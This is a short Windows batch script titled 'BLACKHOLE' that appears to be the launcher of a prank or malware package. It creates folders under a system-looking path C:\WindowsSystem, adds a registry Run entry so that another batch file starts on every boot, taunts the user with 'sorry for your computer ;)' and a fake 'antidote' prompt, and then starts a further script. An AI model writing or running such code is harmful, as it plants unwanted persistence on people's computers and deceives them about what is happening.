@echo off
Title BLACKHOLE
mode con cols=260 lines=260
color 4
type logo.txt
MD C:\WindowsSystem
MD C:\WindowsSystem\aSync
MD C:\WindowsSystem\bSync
MD C:\WindowsSystem\cSync
REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v 01 /t REG_SZ /d "C:\WindowsSystem\cSync\LaunchBH2.bat /f
echo sorry for your computer ;)
echo PRESS ANY KEYS TO HAVE THE ANTIDOTE
timeout 7
start LaunchBHStart.bat


